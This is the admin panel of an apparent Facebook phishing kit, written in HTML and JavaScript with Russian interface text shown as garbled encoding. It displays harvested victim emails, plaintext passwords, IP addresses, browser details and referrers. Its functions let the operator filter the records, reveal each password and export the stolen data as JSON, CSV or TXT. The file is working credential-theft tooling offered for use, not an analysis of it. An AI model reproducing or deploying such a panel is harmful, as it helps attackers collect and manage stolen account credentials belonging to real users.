<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å | Facebook Data</title>
    <style>
        /* –û—Å–Ω–æ–≤–Ω—ã–µ —Å—Ç–∏–ª–∏ –∞–¥–º–∏–Ω–∫–∏ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            color: #1c1e21;
        }
        
        .admin-header {
            background: #1877f2;
            color: white;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1);
        }
        
        .admin-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .admin-title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .admin-subtitle {
            opacity: 0.8;
            font-size: 14px;
        }
        
        /* –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .stat-card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-icon {
            font-size: 40px;
            margin-bottom: 15px;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #65676b;
            font-size: 14px;
        }
        
        /* –ö–Ω–æ–ø–∫–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è */
        .controls {
            display: flex;
            gap: 15px;
            margin: 30px 0;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: #1877f2;
            color: white;
        }
        
        .btn-primary:hover {
            background: #166fe5;
        }
        
        .btn-success {
            background: #42b72a;
            color: white;
        }
        
        .btn-success:hover {
            background: #36a420;
        }
        
        .btn-danger {
            background: #ff4444;
            color: white;
        }
        
        .btn-danger:hover {
            background: #ff3333;
        }
        
        .btn-warning {
            background: #ffbb33;
            color: #333;
        }
        
        .btn-warning:hover {
            background: #ffaa00;
        }
        
        /* –¢–∞–±–ª–∏—Ü–∞ –¥–∞–Ω–Ω—ã—Ö */
        .data-section {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-top: 30px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .section-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #1c1e21;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        .data-table th {
            background: #f0f2f5;
            padding: 15px;
            text-align: left;
            font-weight: bold;
            color: #1c1e21;
            border-bottom: 2px solid #dddfe2;
        }
        
        .data-table td {
            padding: 15px;
            border-bottom: 1px solid #dddfe2;
            vertical-align: top;
        }
        
        .data-table tr:hover {
            background: #f8f9fa;
        }
        
        .data-table .email-cell {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .data-table .password-cell {
            font-family: monospace;
            letter-spacing: 2px;
        }
        
        .data-table .time-cell {
            font-size: 12px;
            color: #65676b;
        }
        
        /* –§–∏–ª—å—Ç—Ä—ã */
        .filters {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .filter-input {
            padding: 10px 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            flex: 1;
            min-width: 200px;
        }
        
        /* –ü–∞–≥–∏–Ω–∞—Ü–∏—è */
        .pagination {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 30px;
        }
        
        .page-btn {
            padding: 8px 15px;
            border: 1px solid #dddfe2;
            background: white;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .page-btn.active {
            background: #1877f2;
            color: white;
            border-color: #1877f2;
        }
        
        /* –ú–æ–¥–∞–ª—å–Ω—ã–µ –æ–∫–Ω–∞ */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-title {
            font-size: 20px;
            margin-bottom: 20px;
            color: #1c1e21;
        }
        
        .modal-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #65676b;
        }
        
        /* –†–µ–∂–∏–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ */
        .preview-mode {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #1877f2;
            color: white;
            padding: 10px 20px;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            z-index: 100;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        
        /* –ó–∞–≥—Ä—É–∑—á–∏–∫ */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å */
        @media (max-width: 768px) {
            .controls {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                justify-content: center;
            }
            
            .filters {
                flex-direction: column;
            }
            
            .filter-input {
                width: 100%;
            }
            
            .data-table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
</head>
<body>
    <!-- –ó–∞–ø—Ä–æ—Å –ø–∞—Ä–æ–ª—è -->
    <div id="passwordModal" class="modal">
        <div class="modal-content">
            <button class="modal-close" onclick="closePasswordModal()">√ó</button>
            <h2 class="modal-title">üîê –í—Ö–æ–¥ –≤ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å</h2>
            <p>–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è –¥–æ—Å—Ç—É–ø–∞:</p>
            <input type="password" id="adminPassword" class="filter-input" placeholder="–ü–∞—Ä–æ–ª—å" style="width: 100%; margin: 15px 0;">
            <div class="controls">
                <button class="btn btn-primary" onclick="checkPassword()">–í–æ–π—Ç–∏</button>
                <button class="btn btn-danger" onclick="window.location.href='index.html'">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
            </div>
            <p style="margin-top: 20px; font-size: 12px; color: #65676b;">
                –ü–æ–¥—Å–∫–∞–∑–∫–∞: –ø–∞—Ä–æ–ª—å —É–∫–∞–∑–∞–Ω –≤ config.js
            </p>
        </div>
    </div>

    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —ç–∫—Å–ø–æ—Ä—Ç–∞ -->
    <div id="exportModal" class="modal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeExportModal()">√ó</button>
            <h2 class="modal-title">üì§ –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö</h2>
            <p>–í—ã–±–µ—Ä–∏—Ç–µ —Ñ–æ—Ä–º–∞—Ç —ç–∫—Å–ø–æ—Ä—Ç–∞:</p>
            <div class="controls" style="margin-top: 20px;">
                <button class="btn btn-primary" onclick="exportData('json')">
                    <span>üìÑ</span> JSON
                </button>
                <button class="btn btn-success" onclick="exportData('csv')">
                    <span>üìä</span> CSV
                </button>
                <button class="btn btn-warning" onclick="exportData('txt')">
                    <span>üìù</span> TXT
                </button>
            </div>
            <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 6px;">
                <h4>üìã –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö:</h4>
                <pre id="dataPreview" style="max-height: 200px; overflow: auto; font-size: 12px; margin-top: 10px;"></pre>
            </div>
        </div>
    </div>

    <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å -->
    <div id="adminInterface" style="display: none;">
        <header class="admin-header">
            <div class="admin-container">
                <h1 class="admin-title">üìä –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å Facebook Data</h1>
                <p class="admin-subtitle">–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏</p>
            </div>
        </header>

        <div class="admin-container">
            <!-- –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ -->
            <div class="stats-grid" id="statsContainer">
                <div class="stat-card">
                    <div class="stat-icon">üë•</div>
                    <div class="stat-value" id="totalUsers">0</div>
                    <div class="stat-label">–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">üìÖ</div>
                    <div class="stat-value" id="todayLogins">0</div>
                    <div class="stat-label">–°–µ–≥–æ–¥–Ω—è</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">üåê</div>
                    <div class="stat-value" id="uniqueIPs">0</div>
                    <div class="stat-label">–£–Ω–∏–∫–∞–ª—å–Ω—ã—Ö IP</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">üïí</div>
                    <div class="stat-value" id="lastLogin">-</div>
                    <div class="stat-label">–ü–æ—Å–ª–µ–¥–Ω–∏–π –≤—Ö–æ–¥</div>
                </div>
            </div>

            <!-- –ö–Ω–æ–ø–∫–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è -->
            <div class="controls">
                <button class="btn btn-primary" onclick="refreshData()">
                    <span>üîÑ</span> –û–±–Ω–æ–≤–∏—Ç—å
                </button>
                <button class="btn btn-success" onclick="showExportModal()">
                    <span>üì§</span> –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö
                </button>
                <button class="btn btn-warning" onclick="showDataPreview()">
                    <span>üëÅÔ∏è</span> –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä
                </button>
                <button class="btn btn-danger" onclick="clearAllData()">
                    <span>üóëÔ∏è</span> –û—á–∏—Å—Ç–∏—Ç—å –≤—Å–µ
                </button>
                <button class="btn" onclick="window.location.href='index.html'" style="background: #f0f2f5; color: #1c1e21;">
                    <span>üè†</span> –ù–∞ –≥–ª–∞–≤–Ω—É—é
                </button>
                <button class="btn" onclick="logoutAdmin()" style="background: #65676b; color: white;">
                    <span>üö™</span> –í—ã–π—Ç–∏
                </button>
            </div>

            <!-- –§–∏–ª—å—Ç—Ä—ã -->
            <div class="filters">
                <input type="text" id="filterEmail" class="filter-input" placeholder="–§–∏–ª—å—Ç—Ä –ø–æ email" onkeyup="filterData()">
                <input type="text" id="filterIP" class="filter-input" placeholder="–§–∏–ª—å—Ç—Ä –ø–æ IP" onkeyup="filterData()">
                <input type="date" id="filterDate" class="filter-input" onchange="filterData()">
                <select id="filterLimit" class="filter-input" onchange="filterData()">
                    <option value="10">10 –∑–∞–ø–∏—Å–µ–π</option>
                    <option value="25" selected>25 –∑–∞–ø–∏—Å–µ–π</option>
                    <option value="50">50 –∑–∞–ø–∏—Å–µ–π</option>
                    <option value="100">100 –∑–∞–ø–∏—Å–µ–π</option>
                    <option value="0">–í—Å–µ –∑–∞–ø–∏—Å–∏</option>
                </select>
            </div>

            <!-- –¢–∞–±–ª–∏—Ü–∞ –¥–∞–Ω–Ω—ã—Ö -->
            <div class="data-section">
                <div class="section-title">
                    <span>üìã –°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</span>
                    <span id="dataCount">–ó–∞–≥—Ä—É–∑–∫–∞...</span>
                </div>
                
                <div id="loader" class="loader"></div>
                
                <table class="data-table" id="dataTable">
                    <thead>
                        <tr>
                            <th width="50">#</th>
                            <th width="200">Email</th>
                            <th width="150">–ü–∞—Ä–æ–ª—å</th>
                            <th width="150">IP –∞–¥—Ä–µ—Å</th>
                            <th width="150">–í—Ä–µ–º—è</th>
                            <th width="200">–ë—Ä–∞—É–∑–µ—Ä</th>
                            <th width="100">–≠–∫—Ä–∞–Ω</th>
                            <th width="100">–î–µ–π—Å—Ç–≤–∏—è</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody">
                        <!-- –î–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç –∑–∞–≥—Ä—É–∂–µ–Ω—ã —á–µ—Ä–µ–∑ JS -->
                    </tbody>
                </table>
                
                <!-- –ü–∞–≥–∏–Ω–∞—Ü–∏—è -->
                <div class="pagination" id="pagination">
                    <!-- –ü–∞–≥–∏–Ω–∞—Ü–∏—è –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω–∞ —á–µ—Ä–µ–∑ JS -->
                </div>
            </div>
            
            <!-- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è -->
            <div class="data-section">
                <div class="section-title">
                    <span>üìà –ê–Ω–∞–ª–∏—Ç–∏–∫–∞</span>
                </div>
                <div id="analytics">
                    <p>–ó–∞–≥—Ä—É–∑–∫–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏...</p>
                </div>
            </div>
        </div>
        
        <!-- –ö–Ω–æ–ø–∫–∞ –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞ -->
        <div class="preview-mode" onclick="goToPreview()">
            üëÅÔ∏è –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä —Å–∞–π—Ç–∞
        </div>
    </div>

    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º —Å–∫—Ä–∏–ø—Ç—ã -->
    <script src="config.js"></script>
    <script src="data.js"></script>
    <script>
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', function() {
            const savedPassword = localStorage.getItem('admin_authenticated');
            if (savedPassword === CONFIG.ADMIN_PASSWORD) {
                showAdminInterface();
            } else {
                showPasswordModal();
            }
        });
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Å –ø–∞—Ä–æ–ª–µ–º
        function showPasswordModal() {
            document.getElementById('passwordModal').style.display = 'flex';
        }
        
        function closePasswordModal() {
            document.getElementById('passwordModal').style.display = 'none';
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–∞—Ä–æ–ª—å
        function checkPassword() {
            const password = document.getElementById('adminPassword').value;
            if (password === CONFIG.ADMIN_PASSWORD) {
                localStorage.setItem('admin_authenticated', password);
                showAdminInterface();
                closePasswordModal();
            } else {
                alert('–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!');
            }
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –∞–¥–º–∏–Ω –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
        function showAdminInterface() {
            document.getElementById('adminInterface').style.display = 'block';
            loadAdminData();
            
            // –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
            if (CONFIG.AUTO_REFRESH_DATA) {
                setInterval(loadAdminData, CONFIG.REFRESH_INTERVAL);
            }
        }
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ –∞–¥–º–∏–Ω–∫—É
        function loadAdminData() {
            const data = DataCollector.loadData();
            const stats = DataCollector.getStats();
            
            // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
            document.getElementById('totalUsers').textContent = stats.totalUsers;
            document.getElementById('todayLogins').textContent = getTodayLogins(data.users);
            document.getElementById('uniqueIPs').textContent = stats.uniqueIPs;
            document.getElementById('lastLogin').textContent = formatTime(stats.lastLogin);
            
            // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–±–ª–∏—Ü—É
            updateTable(data.users);
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∞–Ω–∞–ª–∏—Ç–∏–∫—É
            updateAnalytics(data.users);
            
            // –°–∫—Ä—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
            document.getElementById('loader').style.display = 'none';
        }
        
        // –ü–æ–ª—É—á–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ö–æ–¥–æ–≤ —Å–µ–≥–æ–¥–Ω—è
        function getTodayLogins(users) {
            const today = new Date().toDateString();
            return users.filter(user => {
                const userDate = new Date(user.timestamp).toDateString();
                return userDate === today;
            }).length;
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏
        function formatTime(timestamp) {
            if (!timestamp) return '-';
            const date = new Date(timestamp);
            return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        }
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–∞–±–ª–∏—Ü—ã
        function updateTable(users) {
            const tableBody = document.getElementById('tableBody');
            const dataCount = document.getElementById('dataCount');
            const filterEmail = document.getElementById('filterEmail').value.toLowerCase();
            const filterIP = document.getElementById('filterIP').value.toLowerCase();
            const filterDate = document.getElementById('filterDate').value;
            const filterLimit = parseInt(document.getElementById('filterLimit').value) || 25;
            
            // –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è
            let filteredUsers = users;
            
            if (filterEmail) {
                filteredUsers = filteredUsers.filter(user => 
                    user.email.toLowerCase().includes(filterEmail)
                );
            }
            
            if (filterIP) {
                filteredUsers = filteredUsers.filter(user => 
                    user.ipInfo?.ip?.toLowerCase().includes(filterIP)
                );
            }
            
            if (filterDate) {
                filteredUsers = filteredUsers.filter(user => {
                    const userDate = new Date(user.timestamp).toISOString().split('T')[0];
                    return userDate === filterDate;
                });
            }
            
            // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ
            if (filterLimit > 0) {
                filteredUsers = filteredUsers.slice(-filterLimit).reverse();
            } else {
                filteredUsers = filteredUsers.slice().reverse();
            }
            
            // –û–±–Ω–æ–≤–ª—è–µ–º —Å—á–µ—Ç—á–∏–∫
            dataCount.textContent = `${filteredUsers.length} –∑–∞–ø–∏—Å–µ–π (–≤—Å–µ–≥–æ: ${users.length})`;
            
            // –û—á–∏—â–∞–µ–º —Ç–∞–±–ª–∏—Ü—É
            tableBody.innerHTML = '';
            
            // –ó–∞–ø–æ–ª–Ω—è–µ–º —Ç–∞–±–ª–∏—Ü—É
            filteredUsers.forEach((user, index) => {
                const row = document.createElement('tr');
                
                // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è
                const time = new Date(user.timestamp);
                const formattedTime = time.toLocaleString('ru-RU', {
                    day: '2-digit',
                    month: '2-digit',
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit'
                });
                
                // –û–±—Ä–µ–∑–∞–µ–º user agent
                const shortUserAgent = user.userAgent.length > 50 
                    ? user.userAgent.substring(0, 50) + '...' 
                    : user.userAgent;
                
                row.innerHTML = `
                    <td>${index + 1}</td>
                    <td class="email-cell" title="${user.email}">${user.email}</td>
                    <td class="password-cell" title="${user.password}">${'‚Ä¢'.repeat(user.password.length)}</td>
                    <td title="${user.ipInfo?.ip || 'unknown'}">${user.ipInfo?.ip || 'unknown'}</td>
                    <td class="time-cell" title="${user.timestamp}">${formattedTime}</td>
                    <td title="${user.userAgent}">${shortUserAgent}</td>
                    <td>${user.screenInfo.width}√ó${user.screenInfo.height}</td>
                    <td>
                        <button onclick="viewUserDetails('${user.id}')" style="background: none; border: 1px solid #1877f2; color: #1877f2; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px;">
                            üëÅÔ∏è
                        </button>
                        <button onclick="deleteUser('${user.id}')" style="background: none; border: 1px solid #ff4444; color: #ff4444; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-left: 5px;">
                            üóëÔ∏è
                        </button>
                    </td>
                `;
                
                tableBody.appendChild(row);
            });
        }
        
        // –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö
        function filterData() {
            loadAdminData();
        }
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        function updateAnalytics(users) {
            const analytics = document.getElementById('analytics');
            
            // –ì—Ä—É–ø–ø–∏—Ä–æ–≤–∫–∞ –ø–æ —á–∞—Å–∞–º
            const hourlyData = {};
            users.forEach(user => {
                const hour = new Date(user.timestamp).getHours();
                hourlyData[hour] = (hourlyData[hour] || 0) + 1;
            });
            
            // –°–∞–º—ã–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã
            const browsers = {};
            users.forEach(user => {
                const ua = user.userAgent.toLowerCase();
                let browser = '–î—Ä—É–≥–æ–π';
                
                if (ua.includes('chrome')) browser = 'Chrome';
                else if (ua.includes('firefox')) browser = 'Firefox';
                else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
                else if (ua.includes('edge')) browser = 'Edge';
                else if (ua.includes('opera')) browser = 'Opera';
                
                browsers[browser] = (browsers[browser] || 0) + 1;
            });
            
            // –°–æ–∑–¥–∞–µ–º HTML –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
            let html = `
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
                        <h4>üìä –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ —á–∞—Å–∞–º</h4>
                        <div style="margin-top: 10px;">
            `;
            
            for (let hour = 0; hour < 24; hour++) {
                const count = hourlyData[hour] || 0;
                const barHeight = (count / Math.max(...Object.values(hourlyData), 1)) * 50;
                html += `
                    <div style="display: inline-block; margin-right: 2px; text-align: center;">
                        <div style="height: ${barHeight}px; width: 20px; background: #1877f2; margin: 0 auto;"></div>
                        <div style="font-size: 10px; margin-top: 5px;">${hour}:00</div>
                        <div style="font-size: 10px;">${count}</div>
                    </div>
                `;
            }
            
            html += `
                        </div>
                    </div>
                    
                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
                        <h4>üåê –ë—Ä–∞—É–∑–µ—Ä—ã</h4>
                        <div style="margin-top: 10px;">
            `;
            
            Object.entries(browsers).forEach(([browser, count]) => {
                const percentage = (count / users.length * 100).toFixed(1);
                html += `
                    <div style="margin-bottom: 8px;">
                        <div style="display: flex; justify-content: space-between;">
                            <span>${browser}</span>
                            <span>${count} (${percentage}%)</span>
                        </div>
                        <div style="height: 8px; background: #e4e6eb; border-radius: 4px; margin-top: 4px;">
                            <div style="height: 100%; width: ${percentage}%; background: #42b72a; border-radius: 4px;"></div>
                        </div>
                    </div>
                `;
            });
            
            html += `
                        </div>
                    </div>
                </div>
            `;
            
            analytics.innerHTML = html;
        }
        
        // –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–µ—Ç–∞–ª–µ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function viewUserDetails(userId) {
            const data = DataCollector.loadData();
            const user = data.users.find(u => u.id === userId);
            
            if (user) {
                const details = `
                    ID: ${user.id}
                    Email: ${user.email}
                    –ü–∞—Ä–æ–ª—å: ${user.password}
                    –í—Ä–µ–º—è: ${new Date(user.timestamp).toLocaleString()}
                    IP: ${user.ipInfo?.ip || 'unknown'}
                    User Agent: ${user.userAgent}
                    –≠–∫—Ä–∞–Ω: ${user.screenInfo.width}x${user.screenInfo.height}
                    –Ø–∑—ã–∫: ${user.browserInfo.language}
                    –†–µ—Ñ–µ—Ä–µ—Ä: ${user.referrer}
                `;
                
                alert(details);
            }
        }
        
        // –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function deleteUser(userId) {
            if (confirm('–£–¥–∞–ª–∏—Ç—å —ç—Ç—É –∑–∞–ø–∏—Å—å?')) {
                const data = DataCollector.loadData();
                data.users = data.users.filter(u => u.id !== userId);
                DataCollector.saveData();
                loadAdminData();
            }
        }
        
        // –û—á–∏—Å—Ç–∫–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        function clearAllData() {
            if (confirm('–í–ù–ò–ú–ê–ù–ò–ï! –í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å —É–¥–∞–ª–∏—Ç—å –í–°–ï –¥–∞–Ω–Ω—ã–µ. –≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?')) {
                DataCollector.clearData();
                loadAdminData();
                alert('–í—Å–µ –¥–∞–Ω–Ω—ã–µ —É–¥–∞–ª–µ–Ω—ã!');
            }
        }
        
        // –û–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ
        function refreshData() {
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                loadAdminData();
            }, 500);
        }
        
        // –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö
        function showExportModal() {
            document.getElementById('exportModal').style.display = 'flex';
            updateDataPreview();
        }
        
        function closeExportModal() {
            document.getElementById('exportModal').style.display = 'none';
        }
        
        function updateDataPreview() {
            const preview = document.getElementById('dataPreview');
            const data = DataCollector.exportData('json');
            preview.textContent = data.length > 1000 ? data.substring(0, 1000) + '...' : data;
        }
        
        function exportData(format) {
            DataCollector.downloadData(format);
            closeExportModal();
        }
        
        // –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö
        function showDataPreview() {
            const data = DataCollector.exportData('json');
            const newWindow = window.open();
            newWindow.document.write(`
                <html>
                <head>
                    <title>–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö</title>
                    <style>
                        body { font-family: monospace; padding: 20px; background: #f5f5f5; }
                        pre { background: white; padding: 20px; border-radius: 8px; }
                    </style>
                </head>
                <body>
                    <h2>üìã –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö (JSON)</h2>
                    <pre>${data}</pre>
                </body>
                </html>
            `);
        }
        
        // –ü–µ—Ä–µ—Ö–æ–¥ –≤ —Ä–µ–∂–∏–º –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä–∞
        function goToPreview() {
            window.open('index.html', '_blank');
        }
        
        // –í—ã—Ö–æ–¥ –∏–∑ –∞–¥–º–∏–Ω–∫–∏
        function logoutAdmin() {
            localStorage.removeItem('admin_authenticated');
            window.location.reload();
        }
        
        // –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
        document.addEventListener('keydown', function(e) {
            // F5 - –æ–±–Ω–æ–≤–∏—Ç—å
            if (e.key === 'F5') {
                e.preventDefault();
                refreshData();
            }
            
            // Ctrl+E - —ç–∫—Å–ø–æ—Ä—Ç
            if (e.ctrlKey && e.key === 'e') {
                e.preventDefault();
                showExportModal();
            }
            
            // Ctrl+D - –æ—á–∏—Å—Ç–∏—Ç—å
            if (e.ctrlKey && e.key === 'd') {
                e.preventDefault();
                clearAllData();
            }
            
            // Ctrl+P - –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä
            if (e.ctrlKey && e.key === 'p') {
                e.preventDefault();
                showDataPreview();
            }
            
            // Ctrl+Q - –≤—ã—Ö–æ–¥
            if (e.ctrlKey && e.key === 'q') {
                e.preventDefault();
                logoutAdmin();
            }
        });
    </script>
</body>
</html>
